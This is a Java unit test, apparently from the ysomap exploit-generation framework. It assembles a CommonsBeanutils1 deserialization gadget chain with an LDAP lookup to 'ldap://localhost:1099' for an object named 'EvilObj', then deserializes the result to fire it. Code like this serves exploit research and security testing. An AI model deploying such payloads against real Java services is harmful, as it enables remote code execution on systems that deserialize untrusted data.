package ysomap.core.payload.java.collections;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.LdapAttributeBullet;
import ysomap.core.serializer.Serializer;

/**
 * @author wh1t3P1g
 * @since 2020/5/14
 */
public class CommonsBeanutils1Test {

    @Test
    public void pack() throws Exception {
        Payload payload = new CommonsBeanutils1();
        Bullet bullet = new LdapAttributeBullet();
        bullet.set("ldapURL", "ldap://localhost:1099");
        bullet.set("objectName", "EvilObj");
        payload.setBullet(bullet);
        Serializer serializer = payload.getSerializer();
        serializer.deserialize(serializer.serialize(payload.getObject()));
    }
}